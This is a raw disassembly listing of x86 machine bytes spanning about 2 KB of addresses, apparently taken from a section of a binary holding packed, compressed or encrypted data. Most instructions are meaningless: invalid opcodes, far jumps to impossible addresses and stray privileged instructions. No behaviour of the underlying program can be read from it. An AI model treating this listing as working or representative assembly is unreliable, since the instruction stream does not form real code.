  4120cb:	mov    bl,0xfc
  4120cd:	pop    es
  4120ce:	adc    DWORD PTR [ebx],ecx
  4120d0:	(bad)  
  4120d1:	(bad)  
  4120d2:	push   ds
  4120d3:	mov    dl,0xfc
  4120d5:	pop    ss
  4120d6:	push   ss
  4120d7:	mov    eax,0x2a94ff1b
  4120dc:	popa   
  4120dd:	sti    
  4120de:	mov    bl,0xb3
  4120e0:	jbe    0x412149
  4120e2:	inc    ebx
  4120e3:	call   0xe807:0x99f5ffc8
  4120ea:	ins    DWORD PTR es:[edi],dx
  4120eb:	push   esp
  4120ec:	or     DWORD PTR [eax],eax
  4120ee:	repnz repnz cld 
  4120f1:	fs push ecx
  4120f3:	jno    0x4120e3
  4120f5:	inc    eax
  4120f6:	jmp    0xe9786905
  4120fb:	xor    al,BYTE PTR [edx-0x4ca53ebc]
  412101:	data16 sub BYTE PTR ds:0xcad97478,ch
  412108:	aad    0x39
  41210a:	jmp    0x1e012541
  41210f:	cmp    ecx,DWORD PTR [eax*2+0xfccb5a1]
  412116:	xchg   esi,eax
  412117:	cmp    DWORD PTR [edi],eax
  412119:	call   0x768821ec
  41211e:	(bad)  
  41211f:	push   0xffffffaa
  412121:	ja     0x412196
  412123:	mov    ch,0xb5
  412125:	int    0xfb
  412127:	add    DWORD PTR [ecx+ecx*1],esi
  41212a:	out    dx,eax
  41212b:	das    
  41212c:	mov    bl,0xfd
  41212e:	pop    es
  41212f:	push   ecx
  412130:	push   es
  412131:	sar    esi,0x5e
  412134:	mov    bl,0xfd
  412136:	or     edx,DWORD PTR [esi-0x7]
  412139:	push   cs
  41213a:	call   0xfeb90561
  41213f:	add    BYTE PTR [edi+0x71],dh
  412142:	cli    
  412143:	call   FWORD PTR [ebp-0x6da117fe]
  412149:	mov    edi,ebp
  41214b:	call   FWORD PTR [ebp-0x338a00ee]
  412151:	mov    esi,DWORD PTR [ebx+0x8]
  412154:	and    BYTE PTR [eax-0x3ad800b8],al
  41215a:	rcl    BYTE PTR [eax+ecx*8],0x51
  41215e:	mov    esp,ebp
  412160:	sbb    ecx,esi
  412162:	not    BYTE PTR [esi+0x1b]
  412165:	leave  
  412166:	pop    ebx
  412167:	dec    ebx
  412168:	leave  
  412169:	or     al,BYTE PTR [eax]
  41216b:	je     0x412171
  41216d:	(bad)  
  41216e:	cmp    ebx,DWORD PTR [eax+0x43]
  412171:	dec    edx
  412172:	(bad)  
  412173:	(bad)  
  412174:	fdivr  QWORD PTR [ebx-0x7f]
  412177:	cmp    eax,0x3f43f8
  41217c:	mov    BYTE PTR [esi+0x68],bh
  41217f:	mov    DWORD PTR [eax],0xfffe891d
  412185:	pop    eax
  412186:	or     al,bh
  412188:	inc    ebp
  412189:	mov    al,ds:0x4800000d
  41218e:	xchg   DWORD PTR [ebx-0x4],eax
  412191:	or     BYTE PTR [esi+0x6708f843],al
  412197:	(bad)  
  412198:	addr16 int 0x5f
  41219b:	aas    
  41219c:	add    BYTE PTR [edi+0x594b581e],ah
  4121a2:	or     eax,0x4d1cc00b
  4121a7:	cmp    DWORD PTR [ebp-0x60],0x8b3d740d
  4121ae:	jbe    0x4121aa
  4121b0:	add    ah,ch
  4121b2:	xor    BYTE PTR [ebx+0x1ce46475],cl
  4121b8:	push   esi
  4121b9:	xor    ebx,ebp
  4121bb:	cmp    edi,edi
  4121bd:	jg     0x412237
  4121bf:	jg     0x412236
  4121c1:	dec    ebp
  4121c2:	iret   
  4121c3:	stc    
  4121c4:	pop    es
  4121c5:	out    0xbd,al
  4121c7:	xor    bh,bh
  4121c9:	fs push 0x26d7dd6a
  4121cf:	sbb    DWORD PTR [ebp-0x32],0xef827abc
  4121d6:	imul   eax,DWORD PTR [ebx-0x9a04684],0x4
  4121dd:	mov    dl,0x45
  4121df:	add    dh,BYTE PTR [ebp-0x7a]
  4121e2:	push   cs
  4121e3:	idiv   ebx
  4121e5:	add    BYTE PTR [esi-0xfb521a4],ah
  4121eb:	pop    edi
  4121ec:	loopne 0x4121b6
  4121ee:	jae    0x41225b
  4121f0:	add    dl,BYTE PTR [ebp-0x46]
  4121f3:	pop    ebx
  4121f4:	add    ebx,0x7d
  4121f7:	xor    cl,BYTE PTR [ecx+0x44]
  4121fa:	jns    0x41225b
  4121fc:	add    al,BYTE PTR [eax]
  4121fe:	xor    DWORD PTR [edi+0x6031f3c5],ebp
  412204:	add    al,BYTE PTR [eax]
  412206:	data16 cmp al,0x14
  412209:	(bad)  
  41220a:	hlt    
  41220b:	mov    ebx,0xc9556c51
  412210:	add    ebp,DWORD PTR [edx+0x31]
  412213:	sbb    al,BYTE PTR [edx+ebp*2]
  412216:	xor    DWORD PTR [edi+0x143efbf5],edx
  41221c:	adc    BYTE PTR [edx+0x31],ch
  41221f:	or     al,BYTE PTR [eax+ebp*8]
  412222:	dec    esp
  412223:	dec    edx
  412224:	add    al,BYTE PTR [eax]
  412226:	cmp    ah,BYTE PTR [edx+0x128134f6]
  41222c:	ins    BYTE PTR es:[edi],dx
  41222d:	loopne 0x412294
  41222f:	jecxz  0x4122b0
  412231:	mov    BYTE PTR [ecx+ecx*1+0x61],dh
  412235:	ficomp DWORD PTR [eax+0x6003d309]
  41223b:	je     0x412218
  41223d:	jnp    0x412236
  41223f:	dec    BYTE PTR [eax+eax*4+0x65]
  412243:	add    eax,0x95b03d3
  412248:	push   ecx
  412249:	js     0x41224b
  41224b:	daa    
  41224c:	or     ecx,ebp
  41224e:	or     al,0xf1
  412250:	(bad)  
  412251:	fld    QWORD PTR [eax-0x5bef8ebb]
  412257:	jp     0x4122cd
  412259:	sbb    eax,0xe8717548
  41225e:	add    esi,DWORD PTR [ecx]
  412260:	or     DWORD PTR [edx-0x2],ebp
  412263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412264:	or     DWORD PTR [ebp-0x2f],edi
  412267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412268:	(bad)  
  412269:	lock and BYTE PTR ds:0x5e800071,0x9
  412271:	jmp    0x263e9382
  412276:	aam    0x87
  412278:	(bad)  
  412279:	lock imul esp,edx,0x3b
  41227d:	jmp    0xa848fa85
  412282:	mov    eax,DWORD PTR [esi+0x1e841260]
  412288:	push   es
  412289:	xor    al,0x28
  41228b:	ja     0x412296
  41228d:	jmp    0xf6757164
  412292:	add    esi,DWORD PTR [ecx]
  412294:	add    BYTE PTR [ecx+0x38d91df8],ch
  41229a:	ins    BYTE PTR es:[edi],dx
  41229b:	(bad)
  41229e:	jg     0x412249
  4122a0:	into   
  4122a1:	xchg   esp,eax
  4122a2:	fld    QWORD PTR [ecx-0x7c88048c]
  4122a8:	popa   
  4122a9:	pop    esi
  4122aa:	rcr    BYTE PTR [edi],1
  4122ac:	je     0x4122ad
  4122ae:	add    DWORD PTR [eax],0xb17fc92f
  4122b4:	xor    bh,dh
  4122b6:	shl    BYTE PTR [esi+0x8],1
  4122b9:	jl     0x4122a2
  4122bb:	test   eax,0x62fe72ee
  4122c0:	call   0x73617d3c
  4122c5:	add    BYTE PTR [eax],al
  4122c7:	pushf  
  4122c8:	mov    ebx,0x7925825f
  4122cd:	ficom  WORD PTR [esi+0x6a]
  4122d0:	jo     0x41226b
  4122d2:	dec    edx
  4122d3:	test   al,0x32
  4122d5:	or     DWORD PTR [ebp-0x11],esi
  4122d8:	out    0xd5,eax
  4122da:	enter  0x212b,0x9
  4122de:	lea    ebp,[edx+eax*2+0x3e94fec4]
  4122e5:	popa   
  4122e6:	mov    eax,0xa732798
  4122eb:	sub    DWORD PTR [esi],ebp
  4122ed:	lea    ebp,[eax+ebp*8]
  4122f0:	xor    cl,BYTE PTR [ecx]
  4122f2:	sub    DWORD PTR [esi+ecx*1+0x74],0x432f9fe
  4122fa:	xor    esi,0x35
  4122fd:	or     DWORD PTR [eax],eax
  4122ff:	(bad)  
  412300:	jns    0x412371
  412302:	(bad)  
  412303:	push   esp
  412304:	in     eax,dx
  412305:	imul   eax,DWORD PTR [ebx+0x1c],0xffffffe6
  412309:	jb     0x412315
  41230b:	test   eax,0xe8038e2f
  412310:	xor    cl,BYTE PTR [ecx]
  412312:	push   DWORD PTR [eax+eax*1]
  412315:	mov    cl,0x72
  412317:	je     0x4122ba
  412319:	pop    edx
  41231a:	xchg   ebp,eax
  41231b:	data16 sub BYTE PTR ds:0xb797d261,dh
  412322:	jb     0x4122ac
  412324:	and    al,0xa1
  412326:	jae    0x41239c
  412328:	add    BYTE PTR [ebx+esi*8-0x7dbf078d],ch
  41232f:	gs inc ecx
  412331:	or     bh,bl
  412333:	mov    esi,0x87f39ffe
  412338:	inc    ebp
  412339:	pusha  
  41233a:	repz jae 0x412339
  41233d:	pop    edi
  41233e:	jno    0x412336
  412340:	push   0x3f6bb2
  412345:	jo     0x412300
  412347:	cld    
  412348:	jmp    FWORD PTR [edi-0x7b]
  41234b:	inc    ebx
  41234c:	in     al,0x4b
  41234e:	or     esp,ebp
  412350:	add    bh,cl
  412352:	mov    ah,BYTE PTR [edi-0x7cf92800]
  412358:	jge    0x41237a
  41235a:	push   es
  41235b:	je     0x4129a0
  412361:	dec    ebx
  412362:	or     esp,esp
  412364:	add    BYTE PTR [edi-0x67ff6c76],cl
  41236a:	push   es
  41236b:	push   DWORD PTR [ebp+0x40]
  41236e:	fisub  WORD PTR [edx+0x36]
  412371:	mov    BYTE PTR [esi],al
  412373:	mov    esi,DWORD PTR [ebp+0x30]
  412376:	jg     0x412374
  412378:	mov    eax,DWORD PTR [eax]
  41237a:	rcl    dh,0xe7
  41237d:	push   ecx
  41237e:	arpl   WORD PTR [ebx],sp
  412380:	lods   ax,WORD PTR ds:[esi]
  412382:	sbb    al,0x3d
  412384:	jb     0x41238e
  412386:	cmp    al,0x2e
  412388:	ja     0x41238e
  41238a:	cmp    al,0x3d
  41238c:	jmp    0x412392
  41238e:	sub    al,0x46
  412390:	add    cl,BYTE PTR [edx]
  412392:	enter  0x2e88,0x72
  412396:	push   edx
  412397:	xchg   dl,bh
  412399:	cmp    DWORD PTR [edi],esp
  41239b:	or     al,BYTE PTR [eax+0x4e158ec]
  4123a1:	xor    BYTE PTR [ecx],0x8c
  4123a4:	ret    0xf57f
  4123a7:	gs inc edx
  4123a9:	fild   QWORD PTR ds:0x68a94676
  4123af:	ja     0x4123fa
  4123b1:	je     0x41239a
  4123b3:	sbb    BYTE PTR [ebx-0x91d12b4],cl
  4123b9:	out    0xb6,eax
  4123bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123bc:	(bad)  
  4123bd:	(bad)  
  4123be:	je     0x412388
  4123c0:	add    eax,DWORD PTR [eax]
  4123c2:	xor    DWORD PTR [eax-0x73],esp
  4123c5:	inc    esp
  4123c6:	add    eax,0x5b00e8b0
  4123cb:	pusha  
  4123cc:	call   0xe8a16cd0
  4123d1:	jmp    DWORD PTR [ebp-0x31b0a15c]
  4123d7:	pop    esp
  4123d8:	xchg   edx,eax
  4123d9:	dec    edx
  4123da:	jo     0x41243c
  4123dc:	pop    es
  4123dd:	rol    BYTE PTR [eax],0x45
  4123e0:	ds jg  0x41245f
  4123e3:	fstp   DWORD PTR [edi-0xa]
  4123e6:	sbb    ebp,DWORD PTR [esi+0x1cfe569c]
  4123ec:	sub    BYTE PTR [ebp+0x74],bh
  4123ef:	xchg   ebp,eax
  4123f0:	jb     0x4123e7
  4123f2:	jmp    0x41238a
  4123f4:	hlt    
  4123f5:	or     ch,al
  4123f7:	int3   
  4123f8:	arpl   WORD PTR [ebx-0x2],di
  4123fb:	xchg   ah,dl
  4123fd:	pop    ebx
  4123fe:	out    0x88,eax
  412400:	sbb    al,0x4
  412402:	add    BYTE PTR [esi-0x2c],dh
  412405:	outs   dx,DWORD PTR ds:[esi]
  412406:	out    0x68,eax
  412408:	and    eax,0x3466fe7d
  41240d:	ins    BYTE PTR es:[edi],dx
  41240e:	out    0x60,eax
  412410:	xor    eax,0x3456fe7d
  412415:	push   0x7d2558e7
  41241a:	(bad)  
  41241b:	mov    ah,0x8
  41241d:	sub    al,0x74
  41241f:	out    dx,al
  412420:	pusha  
  412421:	add    bl,dl
  412423:	aaa    
  412424:	jno    0x41245b
  412426:	fdivp  st(1),st
  412428:	dec    ebx
  412429:	fadd   QWORD PTR [ebx]
  41242b:	jl     0x4123b1
  41242d:	xchg   esp,eax
  41242e:	xor    dl,0x6d
  412431:	adc    al,BYTE PTR [ebx+ecx*4]
  412434:	(bad)  
  412435:	jne    0x41242d
  412437:	ss popa 
  412439:	call   0x6fb22c09
  41243e:	(bad)  
  41243f:	cli    
  412440:	jo     0x412415
  412442:	or     eax,DWORD PTR [eax]
  412444:	or     DWORD PTR [esp+edx*2],ebp
  412447:	jl     0x412438
  412449:	jecxz  0x41242e
  41244b:	imul   esi,DWORD PTR [eax+eax*8],0x45
  41244f:	jl     0x41247c
  412451:	dec    ecx
  412452:	mov    ah,0x1d
  412454:	and    ecx,0x90e4fc0
  41245a:	rol    DWORD PTR [ebx],0x31
  41245d:	pusha  
  41245e:	data16 jmp 0x41249f
  412461:	call   0x70a2280d
  412466:	fwait
  412467:	or     ebx,DWORD PTR [ecx-0x58836897]
  41246d:	popa   
  41246e:	pop    esp
  41246f:	leave  
  412470:	lahf   
  412471:	jo     0x412470
  412473:	cmc    
  412474:	call   0xa108:0x990b7b70
  41247b:	jl     0x412404
  41247d:	inc    edx
  41247e:	stos   BYTE PTR es:[edi],al
  41247f:	add    BYTE PTR [ecx],dh
  412481:	(bad)  
  412482:	jno    0x4124ec
  412484:	mov    bl,0x45
  412486:	aam    0xd3
  412488:	fmul   DWORD PTR [eax]
  41248a:	inc    ebx
  41248b:	ret    0xf667
  41248e:	lock imul ecx,DWORD PTR [eax-0x56844238],0xffffffc6
  412496:	push   DWORD PTR [esi+edi*4+0x6c213a2d]
  41249d:	jo     0x41251d
  41249f:	out    0x32,al
  4124a1:	cmc    
  4124a2:	push   eax
  4124a3:	adc    eax,ebp
  4124a5:	out    0x40,al
  4124a7:	jmp    0xcca927ac
  4124ac:	xlat   BYTE PTR ds:[ebx]
  4124ad:	xor    cl,BYTE PTR [ecx]
  4124af:	or     ebp,DWORD PTR [ecx-0x1114f5df]
  4124b5:	or     al,BYTE PTR [ebp+0x66]
  4124b8:	sub    BYTE PTR ds:0x432de7d8,dh
  4124be:	or     DWORD PTR [eax],eax
  4124c0:	bnd jb 0x4124bf
  4124c3:	and    dh,BYTE PTR [esi+0x5654008a]
  4124c9:	push   0x3
  4124cb:	rcl    ch,0x45
  4124ce:	fldenv [edi-0x17]
  4124d1:	xor    ah,BYTE PTR [eax-0x43]
  4124d4:	shl    DWORD PTR [esi-0x19],1
  4124d7:	inc    eax
  4124d8:	jmp    0xe1b593bf
  4124dd:	pop    edx
  4124de:	sbb    BYTE PTR [ebx+0x26],dh
  4124e1:	cmp    ch,BYTE PTR [eax+0x20]
  4124e4:	mov    bl,0x3b
  4124e6:	outs   dx,DWORD PTR ds:[esi]
  4124e7:	sti    
  4124e8:	(bad)  
  4124ea:	mov    al,0xfe
  4124ec:	push   cs
  4124ed:	sub    ch,BYTE PTR [edi-0xf]
  4124f0:	push   edi
  4124f1:	pop    ebp
  4124f2:	or     BYTE PTR [ebp+0x4e],dh
  4124f5:	sbb    dh,ch
  4124f7:	sti    
  4124f8:	test   BYTE PTR [ecx+0x7267e807],0x6e
  4124ff:	inc    BYTE PTR [esi-0x14]
  412502:	dec    ecx
  412503:	add    ebp,ecx
  412505:	popa   
  412506:	sub    bl,0x68
  412509:	cs inc eax
  41250b:	test   dh,0x0
  41250e:	jmp    0x41258c
  412510:	inc    esp
  412511:	add    BYTE PTR [ebx+ebx*2-0x3],dh
  412515:	jne    0x41258f
  412517:	bnd jae 0x412526
  41251a:	jo     0x41252c
  41251c:	add    BYTE PTR ss:[eax-0x2],bl
  412520:	mov    edi,0x238cd0f
  412525:	add    BYTE PTR [eax-0x36],cl
  412528:	inc    ebx
  412529:	clc    
  41252a:	sbb    BYTE PTR [ebx],cl
  41252c:	add    BYTE PTR [eax],al
  41252e:	iret   
  41252f:	dec    ecx
  412530:	out    dx,al
  412531:	dec    DWORD PTR [edi]
  412533:	or     eax,DWORD PTR [eax]
  412535:	push   0x8
  412537:	pop    ebp
  412538:	(bad)  
  412539:	imul   ebx,DWORD PTR [eax],0x4d8cfe5d
  41253f:	cmc    
  412540:	dec    esi
  412541:	lea    ecx,[ebp+0x57fff5fa]
  412547:	pop    edx
  412548:	std    
  412549:	jne    0x4124cb
  41254b:	repz jae 0x41254a
  41254e:	jo     0x412533
  412550:	xor    eax,DWORD PTR [eax]
  412552:	enter  0xbfff,0x74
  412556:	int    0xdd
  412558:	test   BYTE PTR [ecx],0xd8
  41255b:	or     ch,BYTE PTR [eax-0x6e]
  41255e:	nop
  41255f:	inc    ebp
  412560:	(bad)  
  412561:	(bad)  
  412562:	popf   
  412563:	sbb    ch,al
  412565:	inc    eax
  412566:	test   ebx,esi
  412568:	std    
  412569:	push   eax
  41256a:	adc    ebx,edx
  41256c:	mov    eax,DWORD PTR [ebp-0x204b8]
  412572:	add    BYTE PTR [eax-0x3acf19ac],bh
  412578:	repz std 
  41257a:	mov    DWORD PTR ds:0x97fff5e6,ebx
  412580:	jecxz  0x412506
  412582:	dec    ecx
  412583:	xchg   edi,eax
  412584:	lock mov eax,DWORD PTR [ebp+0x5c]
  412588:	push   ebp
  412589:	data16 xor dh,BYTE PTR [ecx]
  41258c:	enter  0xffc2,0x67
  412590:	xchg   ebp,eax
  412591:	neg    BYTE PTR [bp+0x47]
  412595:	js     0x41260b
  412597:	and    eax,0x4e4b8058
  41259c:	mov    bh,0x8a
  41259e:	test   BYTE PTR [ecx-0x49],ch
  4125a1:	js     0x4125a1
  4125a3:	retf   
  4125a4:	pop    edi
  4125a5:	jmp    0xe4ff:0x420c93a
  4125ac:	xor    DWORD PTR [eax-0x2],0x26
  4125b0:	jg     0x4125a0
  4125b2:	or     ecx,DWORD PTR [ecx]
  4125b4:	adc    al,0xc8
  4125b6:	(bad)  
  4125b7:	push   ss
  4125b8:	stc    
  4125b9:	jle    0x4125a2
  4125bb:	push   es
  4125bc:	idiv   DWORD PTR [eax+0x69]
  4125bf:	xor    DWORD PTR [eax],ecx
  4125c1:	ret    0x7067
  4125c4:	pusha  
  4125c5:	ja     0x41257b
  4125c7:	add    eax,0xeefe78d7
  4125cc:	dec    esp
  4125cd:	push   es
  4125ce:	call   0xfeb8b253
  4125d3:	test   al,0xdc
  4125d5:	pop    edi
  4125d6:	test   BYTE PTR [eax],0xd6
  4125d9:	xchg   DWORD PTR cs:[ebp+eiz*8+0x61fe792e],eax
  4125e1:	dec    eax
  4125e2:	fsub   DWORD PTR [edi+0x70]
  4125e5:	pusha  
  4125e6:	ja     0x41259c
  4125e8:	lds    edx,FWORD PTR [esi]
  4125ea:	jns    0x4125ea
  4125ec:	scas   al,BYTE PTR es:[edi]
  4125ed:	mov    WORD PTR [esi],es
  4125ef:	call   0xfeb8b254
  4125f4:	sub    ah,BYTE PTR [eax]
  4125f6:	lock sbb BYTE PTR [edx-0x7109afd4],dh
  4125fd:	jbe    0x4125fd
  4125ff:	je     0x412622
  412601:	pop    edi
  412602:	xor    cl,BYTE PTR [edi+0x70c908b4]
  412608:	ja     0x412677
  41260a:	cmp    BYTE PTR [esp+ebp*2-0x40],ch
  41260e:	aad    0x78
  412610:	pop    ebx
  412611:	adc    al,0xe2
  412613:	inc    ebx
  412614:	loop   0x41261c
  412616:	sbb    DWORD PTR [eax+eiz*2-0x40],ebp
  41261a:	mov    ebp,0xc8837778
  41261f:	jo     0x412668
  412621:	ins    DWORD PTR es:[edi],dx
  412622:	rol    DWORD PTR [ebx],cl
  412624:	xor    DWORD PTR [ecx],ecx
  412626:	adc    eax,DWORD PTR [ecx+ecx*8]
  412629:	mov    ebx,0x6c2ec310
  41262e:	pop    ebx
  41262f:	addr16 pop ds
  412631:	ins    DWORD PTR es:[edi],dx
  412632:	lea    edi,[eax-0x5b]
  412635:	std    
  412636:	nop
  412637:	ins    BYTE PTR es:[edi],dx
  412638:	imul   ebp,DWORD PTR [ebp+edi*2-0x76],0x0
  41263d:	mov    ch,0x4d
  41263f:	jge    0x4126b9
  412641:	pop    es
  412642:	loopne 0x41262c
  412644:	jmp    0x4125cf
  412646:	loope  0x4125ef
  412648:	add    esi,esi
  41264a:	mov    dh,0x4c
  41264c:	jo     0x41263d
  41264e:	ins    BYTE PTR es:[edi],dx
  41264f:	push   ebp
  412650:	out    dx,al
  412651:	cmp    ah,BYTE PTR [ecx+0x38]
  412654:	int3   
  412655:	fild   QWORD PTR [edi+ebp*2+0x7e]
  412659:	out    0x74,al
  41265b:	cmp    eax,0x10aeb378
  412660:	jo     0x412629
  412662:	ins    BYTE PTR es:[edi],dx
  412663:	call   0xe8d6db70
  412668:	add    esi,DWORD PTR [ecx]
  41266a:	loope  0x412600
  41266c:	jmp    0x41265f
  41266e:	or     BYTE PTR [esi+edi*4-0x5e],ah
  412672:	(bad)  ds:0x57486ae
  412678:	js     0x412608
  41267a:	sti    
  41267b:	jp     0x4126f5
  41267d:	pop    DWORD PTR [eax]
  41267f:	add    BYTE PTR [ecx],ch
  412681:	xchg   esi,eax
  412682:	lock sub BYTE PTR [esi+ecx*1+0x6c],0x72
  412688:	pop    edi
  412689:	mov    dl,0xad
  41268b:	jecxz  0x412663
  41268d:	out    0x6a,al
  41268f:	call   FWORD PTR [eax+ebx*2-0x79]
  412693:	mov    esp,0xfe6acec1
  412698:	jmp    0xd9a90ee3
  41269d:	xor    bl,BYTE PTR [ebp+edi*4-0x4a]
  4126a1:	add    BYTE PTR [eax+0x4],al
  4126a4:	call   0xfeac9879
  4126a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126aa:	and    BYTE PTR [esi+esi*8-0x62],0xa6
  4126af:	imul   esi,DWORD PTR [ecx+eiz*8-0x66],0xffffffdd
  4126b4:	inc    esp
  4126b5:	mov    fs,WORD PTR [esi-0x79724b95]
  4126bb:	imul   edi,esi,0x7e
  4126be:	add    BYTE PTR [eax+ebp*8],al
  4126c1:	push   ss
  4126c2:	lock push 0xfffffffe
  4126c5:	outs   dx,BYTE PTR ds:[esi]
  4126c6:	add    BYTE PTR [eax-0x2],bh
  4126c9:	pushf  
  4126ca:	push   ebp
  4126cb:	jae    0x4126cb
  4126cd:	pop    esi
  4126ce:	data16 cmc 
  4126d0:	pop    es
  4126d1:	inc    ecx
  4126d2:	adc    eax,esi
  4126d4:	dec    BYTE PTR [esi+0x66]
  4126d7:	mov    ch,0xdf
  4126d9:	ds pop esi
  4126db:	imul   edi,esi,0xffffffb4
  4126de:	cmp    ah,BYTE PTR [ecx-0x23]
  4126e1:	lods   eax,DWORD PTR ds:[esi]
  4126e2:	aas    
  4126e3:	imul   edi,esi,0x74
  4126e6:	pop    ecx
  4126e7:	jae    0x4126e7
  4126e9:	es ds cmc 
  4126ec:	pop    es
  4126ed:	adc    DWORD PTR [ebx-0x3a],esp
  4126f0:	(bad)  
  4126f1:	push   ss
  4126f2:	push   ds
  4126f3:	mov    ch,0xcf
  4126f5:	push   ss
  4126f6:	es imul edi,esi,0x0
  4126fa:	adc    eax,0xd524e800
  4126ff:	repnz std 
  412701:	inc    DWORD PTR [ebp-0x33]
  412704:	cmc    
  412705:	inc    DWORD PTR [eax]
  412707:	(bad)  
  412708:	fild   WORD PTR [eax+ecx*2]
  41270b:	(bad)  
  41270c:	repnz std 
  41270e:	mov    ch,0x80
  412710:	(bad)  
  412712:	push   DWORD PTR [eax-0x12]
  412715:	inc    ebp
  412716:	jmp    FWORD PTR [edi-0xe]
  412719:	mov    bl,0xdc
  41271b:	xchg   edi,eax
  41271c:	repnz std 
  41271e:	call   0x3ed1ab
  412723:	jg     0x4126dd
  412725:	loop   0x41271e
  412727:	(bad)  
  412728:	repnz out 0xe5,al
  41272b:	pop    es
  41272c:	hlt    
  41272d:	std    
  41272e:	inc    DWORD PTR [ebp-0x40000a2a]
  412734:	(bad)  
  412736:	inc    edi
  412737:	scas   eax,DWORD PTR es:[edi]
  412738:	repz std 
  41273a:	mov    ch,0xbc
  41273c:	(bad)  
  41273e:	dec    DWORD PTR [edi+0x5ff0a79]
  412744:	jmp    edi
  412746:	(bad)  
  412747:	(bad)  
  412748:	repz std 
  41274a:	call   DWORD PTR [ebp-0x70000a1e]
  412750:	fidivr WORD PTR [edi+eax*2+0x45fdf37f]
  412757:	sbb    ch,0xd8
  41275a:	std    
  41275b:	outs   dx,DWORD PTR ds:[esi]
  41275c:	repz std 
  41275e:	jne    0x41276c
  412760:	(bad)  
  412762:	xor    ebx,eax
  412764:	push   es
  412765:	leave  
  412766:	ret    0x6dc
  412769:	push   ebp
  41276a:	mov    eax,DWORD PTR [eax]
  41276c:	sbb    al,0x87
  41276e:	ret    0x1de4
  412771:	dec    ecx
  412772:	cli    
  412773:	push   eax
  412774:	xor    DWORD PTR [eax+0x5ff06817],ecx
  41277a:	jmp    0x4ff:0x2a10edd
  412781:	pop    esp
  412782:	push   0xffffffa5
  412784:	sti    
  412785:	jb     0x4127fb
  412787:	or     dh,BYTE PTR [ecx-0xc]
  41278a:	jmp    0x7826d9de
  41278f:	add    esp,esp
  412791:	sub    dh,BYTE PTR [ebp+0x2f]
  412794:	mov    dh,0x1d
  412796:	jl     0x412718
  412798:	fcom   QWORD PTR [edi+0x6f]
  41279b:	add    BYTE PTR [ecx],dh
  41279d:	pusha  
  41279e:	in     al,dx
  41279f:	push   es
  4127a0:	jbe    0x4127c7
  4127a2:	jl     0x412797
  4127a4:	xor    BYTE PTR [eax+0x2],ah
  4127a7:	jmp    0x41279c
  4127a9:	call   0x40ea:0x3ac9f7ee
  4127b0:	xor    ebp,ebx
  4127b2:	mov    esi,0xee8881e3
  4127b7:	xor    dh,BYTE PTR [ecx]
  4127b9:	pusha  
  4127ba:	jg     0x41277f
  4127bc:	and    eax,0x748d0416
  4127c1:	test   bl,dl
  4127c3:	addr16 out 0xfa,eax
  4127c6:	ret    0xffff
  4127c9:	je     0x4127d1
  4127cb:	call   0xfeb4de24
  4127d0:	add    BYTE PTR [edx],bh
  4127d2:	and    al,dh
  4127d4:	adc    eax,DWORD PTR [ecx-0x31fffeb8]
  4127da:	jns    0x4127af
  4127dc:	(bad)  
  4127dd:	pop    esp
  4127de:	js     0x41284a
  4127e0:	ds pop esp
  4127e2:	sub    esi,DWORD PTR [ebp-0x19]
  4127e5:	adc    al,0x9b
  4127e7:	jae    0x4127e7
  4127e9:	mov    esi,0x34827a8c
  4127ee:	or     DWORD PTR [ecx],esp
  4127f0:	add    al,0x24
  4127f2:	mov    cl,0x10
  4127f4:	adc    eax,0x4b1569ee
  4127f9:	jo     0x4127fb
  4127fb:	jmp    0x699dd3ce
  412800:	inc    eax
  412801:	mov    bl,dh
  412803:	call   0x7bab17f1
  412808:	or     ecx,DWORD PTR [ecx+0x7774a4c7]
  41280e:	jg     0x41283b
  412810:	js     0x4127e8
  412812:	ins    BYTE PTR es:[edi],dx
  412813:	inc    ebp
  412814:	ret    
  412815:	pushw  0x1b
  412818:	scas   al,BYTE PTR es:[edi]
  412819:	test   bh,0xe8
  41281c:	je     0x4127fb
  41281e:	add    cl,dl
  412820:	jae    0x41286c
  412822:	imul   edi,DWORD PTR [ebp+0x27e14aeb],0xe906c904
  41282c:	add    esi,DWORD PTR [ecx+0x190c1b69]
  412832:	dec    eax
  412833:	pushf  
  412834:	je     0x412836
  412836:	daa    
  412837:	imul   ebx,ebx,0xe8ca76ad
  41283d:	je     0x4127dc
  41283f:	adc    DWORD PTR [ecx+0x7d690e2a],edx
  412845:	jmp    0x412877
  412847:	or     ecx,ebp
  412849:	cmp    edi,0xffffffde
  41284c:	loopne 0x4128b9
  41284e:	sbb    ch,BYTE PTR [eax+0x65]
  412851:	je     0x412842
  412853:	ficomp WORD PTR [esp+esi*2+0x5d]
  412857:	adc    DWORD PTR [ecx+0x3a],eax
  41285a:	jne    0x4128c4
  41285c:	dec    ebp
  41285d:	dec    edx
  41285e:	lock or eax,0x75bbcee9
  412864:	imul   edi,DWORD PTR [edi],0x9dffbfea
  41286a:	enter  0x6868,0xa1
  41286e:	cmp    eax,0x91107dd
  412873:	retf   
  412874:	(bad)  
  412875:	push   ds
  412876:	mov    ebx,0x676afbcd
  41287b:	jge    0x4128c7
  41287d:	test   al,0x32
  41287f:	or     DWORD PTR [edi],ecx
  412881:	ins    DWORD PTR es:[edi],dx
  412882:	test   DWORD PTR [eax],0x25b1e900
  412888:	cwde   
  412889:	mov    ds:0xdefe6873,al
  41288e:	mul    BYTE PTR [edi-0x73cd1700]
  412894:	cmp    al,0x89
  412896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412897:	leave  
  412898:	(bad)  
  412899:	call   0xb2ce5b9e
  41289e:	call   0x4c431d5
  4128a3:	push   ebp
  4128a4:	rol    DWORD PTR [eax-0x17],cl
  4128a7:	xor    bl,BYTE PTR [eax]
  4128a9:	test   BYTE PTR [edi+0x6a000934],cl
  4128af:	add    ch,ch
  4128b1:	dec    edx
  4128b2:	sub    BYTE PTR ds:0xb4650f09,dh
  4128b8:	or     BYTE PTR [eax],al
  4128ba:	jmp    0x22a94d76
  4128bf:	in     al,dx
  4128c0:	addr16 (bad) 
  4128c2:	div    BYTE PTR [esi+0x32e90093]
  4128c8:	mov    WORD PTR [eax*1-0x17003742],?
  4128cf:	xor    ecx,DWORD PTR [ebp+0x932e87e]
  4128d5:	sbb    DWORD PTR [ecx+eax*8],0xffffffd2
  4128d9:	inc    eax
  4128da:	jmp    0xdbc54111
  4128df:	sub    eax,0xe0000009
  4128e4:	out    0x66,eax
  4128e6:	inc    ecx
